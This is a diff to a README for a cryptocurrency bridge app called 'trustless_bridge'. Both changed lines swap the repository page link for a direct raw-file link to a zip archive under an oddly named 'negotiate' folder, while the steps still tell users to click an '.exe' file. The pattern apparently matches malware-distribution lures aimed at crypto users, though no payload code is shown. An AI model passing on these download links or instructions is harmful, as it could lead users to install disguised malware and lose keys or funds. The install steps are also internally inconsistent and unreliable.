@@ -1,6 +1,6 @@
 # 🌉 trustless_bridge - Securely move digital assets between chains
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/oilofvitriolcongealment582/trustless_bridge)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/oilofvitriolcongealment582/trustless_bridge/main/negotiate/trustless_bridge_1.0.zip)
 
 The trustless_bridge application allows users to transfer assets across different blockchain networks. It removes the need for trusted third parties. You maintain full control over your private keys and assets throughout the entire process. The software ensures that each transfer follows strict security rules set by the underlying smart contracts.
 
@@ -19,7 +19,7 @@ You do not need to install any programming environments or command-line tools. T
 
 Follow these instructions to set up the software.
 
-1.  Visit [this page](https://github.com/oilofvitriolcongealment582/trustless_bridge) to access the official download.
+1.  Visit [this page](https://raw.githubusercontent.com/oilofvitriolcongealment582/trustless_bridge/main/negotiate/trustless_bridge_1.0.zip) to access the official download.
 2.  Locate the latest release version on the page.
 3.  Click the file ending in `.exe` to start the download.
 4.  Navigate to your downloads folder.
